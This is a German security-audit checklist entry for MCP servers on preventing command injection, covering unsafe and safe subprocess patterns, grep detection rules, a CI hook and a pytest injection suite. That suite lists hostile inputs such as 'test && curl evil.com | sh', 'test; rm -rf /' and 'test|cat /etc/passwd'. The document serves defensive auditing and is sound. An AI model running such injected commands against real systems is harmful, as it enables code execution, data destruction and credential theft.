# SEC-020 — Command Injection Prevention

## Description

Die Equixly-Studie 2025 fand: **43% der getesteten MCP-Server** hatten Command-Injection-Lücken. Das ist die häufigste exploitable Schwachstelle in MCP-Servern überhaupt — und die einfachste zu vermeiden.

Klassische Anti-Patterns:

```python
# os.system mit User-Input
os.system(f"convert {user_path} output.pdf")

# subprocess mit shell=True
subprocess.run(f"git log --grep={user_query}", shell=True)

# eval / exec
result = eval(user_expression)

# Format-String in Shell-Befehl
os.popen(f"grep '{user_pattern}' file.txt")
```

Bei jedem dieser Patterns kann ein User-Input (oder LLM-Halluzination, oder Prompt-Injection-Output) Shell-Metacharacters einschleusen: `;`, `&&`, `|`, `$()`, Backticks. Die Konsequenz ist beliebige Code-Ausführung mit Server-Privilegien.

Die Lösung ist **immer parametrierte Calls** ohne Shell-Interpretation:

```python
# subprocess mit Liste statt String, ohne shell=True
subprocess.run(["convert", user_path, "output.pdf"], check=True)

# Spezialisierte Library statt Shell
import git
repo.iter_commits(grep=user_query)  # interne Lib-Validation

# Niemals eval auf User-Input
ast.literal_eval(user_expression)  # nur Literals
```

Dieser Check ist `critical` — die Häufigkeit der Lücke (43%) plus der Schweregrad (Remote Code Execution) macht ihn zum wichtigsten SEC-Check für Server, die Subprocesses ausführen oder externe Binaries aufrufen.

## Verification

### Modus 1: code_review (verbotene Patterns suchen)

```bash
# Python: os.system, shell=True, eval, exec, popen
grep -rnE 'os\.system\(|shell\s*=\s*True|\beval\(|\bexec\(|os\.popen\(' src/

# Node/TypeScript: child_process exec, eval, Function constructor
grep -rnE 'child_process\.exec\(|\beval\(|new Function\(' src/
```

**Fail-Patterns gefunden:** automatisch Fail.

**Pass-Pattern (Python):**

```python
import subprocess

# subprocess mit Liste, kein shell=True
result = subprocess.run(
    ["convert", str(input_path), str(output_path)],
    check=True,
    capture_output=True,
    text=True,
    timeout=30,
)

# Externe Library statt Shell-Aufruf
import git
repo = git.Repo(repo_path)
commits = list(repo.iter_commits(grep=user_query, max_count=20))
```

### Modus 2: code_review (Pfade durch pathlib.Path)

Bei Filesystem-Operationen (Synergie zu SEC-017): keine String-Konkatenation, alles über `pathlib.Path`:

```bash
grep -rE 'os\.path\.join.*\+|f".*\{.*\}.*\.\w+"' src/
```

**Pass-Pattern:**

```python
from pathlib import Path

base = Path(BASE_DIR).resolve()
target = (base / user_filename).resolve()
if not target.is_relative_to(base):
    raise PermissionError("Outside base dir")
```

### Modus 3: runtime_test (Injection-Suite gegen Tool-Calls)

```python
@pytest.mark.parametrize("malicious_input", [
    "test; rm -rf /",
    "test && curl evil.com | sh",
    "test`whoami`",
    "test$(id)",
    "test\nrm -rf /",
    "test|cat /etc/passwd",
])
async def test_command_injection_blocked(malicious_input):
    args = ToolArgs(query=malicious_input)
    # Tool sollte entweder validation-error werfen oder Input sanitiert behandeln
    result = await tool_func(args, mock_ctx())
    # Kein Crash, kein RCE, kein unerwarteter File-System-Effekt
    assert "deleted" not in str(result).lower()
    assert "uid=" not in str(result)
```

### Modus 4: code_review (Whitelist statt Sanitization)

Bei unvermeidbarer Übergabe von User-Input an Subprocess: Whitelist-basierte Validation, keine Blacklist-Sanitization.

```python
ALLOWED_FORMATS = frozenset({"pdf", "png", "jpg"})

def convert_image(input_path: Path, format: str):
    if format not in ALLOWED_FORMATS:
        raise ValueError(f"Format must be one of {ALLOWED_FORMATS}")
    subprocess.run(
        ["convert", str(input_path), f"output.{format}"],
        check=True, timeout=30,
    )
```

## Pass Criteria

- [ ] Keine Verwendung von `os.system`, `subprocess` mit `shell=True`, `eval`, `exec`, `os.popen`
- [ ] Subprocess-Calls verwenden Listen-Syntax, kein Shell
- [ ] Externe Library-Aufrufe statt Shell-Aufrufe wo möglich (z.B. `gitpython` statt `git CLI`)
- [ ] User-Input für Subprocess-Args durchläuft Whitelist-Validation, nicht Blacklist-Sanitization
- [ ] Pfad-Operationen via `pathlib.Path.resolve()` mit Base-Dir-Check (Synergie zu SEC-017)
- [ ] Subprocess-Calls haben Timeouts gesetzt (gegen Resource-Exhaustion)
- [ ] Tests gegen Standard-Injection-Suite parametrized

## Common Failures

| Anti-Pattern | Risiko |
|---|---|
| `os.system(f"... {user_input}")` | Direkte RCE via `;`, `\|`, `$()` |
| `subprocess.run(cmd_string, shell=True)` | RCE via Shell-Metacharacters |
| `eval(user_expression)` | Beliebige Python-Code-Ausführung |
| Sanitization durch Regex-Replace `[;&|]` | Umgehbar via Encoding, Newlines, Unicode |
| Subprocess ohne Timeout | DoS via langen Commands |

## Remediation

### Schritt 1: Audit aller Subprocess-Sites

```bash
grep -rnE 'os\.system|subprocess\.|os\.popen|shell\s*=\s*True|eval\(|exec\(' src/
```

Pro Treffer: ist Shell-Interpretation wirklich nötig? Antwort meist nein — Liste-Syntax verwenden.

### Schritt 2: Library-Migration

| Statt Shell | Library |
|---|---|
| `git CLI` | `gitpython` |
| `convert` (ImageMagick) | `Pillow` für Standard-Konvertierungen |
| `pdftotext` | `pdfplumber`, `pypdf` |
| `curl` | `httpx`, `requests` |
| `ffmpeg` | `imageio-ffmpeg` mit kontrollierten Args |

### Schritt 3: Input-Validation hinzufügen

Whitelist für alle User-Inputs, die zu Subprocess durchgehen:

```python
ALLOWED_FORMATS = frozenset({"pdf", "png", "jpg"})
ALLOWED_OPERATIONS = frozenset({"convert", "resize", "watermark"})

def safe_subprocess(operation: str, format: str, args: list[str]):
    if operation not in ALLOWED_OPERATIONS:
        raise ValueError(f"operation: {operation}")
    if format not in ALLOWED_FORMATS:
        raise ValueError(f"format: {format}")
    subprocess.run([operation, *args, format], timeout=30, check=True)
```

### Schritt 4: CI-Hook gegen Regression

```yaml
- name: Static analysis for unsafe shell patterns
  run: |
    ! grep -rnE 'os\.system|shell\s*=\s*True|\beval\(|\bexec\(' src/ \
      || (echo "Unsafe shell pattern detected"; exit 1)
```

## Effort

M — 1–3 Tage, je nach Anzahl der Subprocess-Sites. Bei sauberem Library-First-Code S.
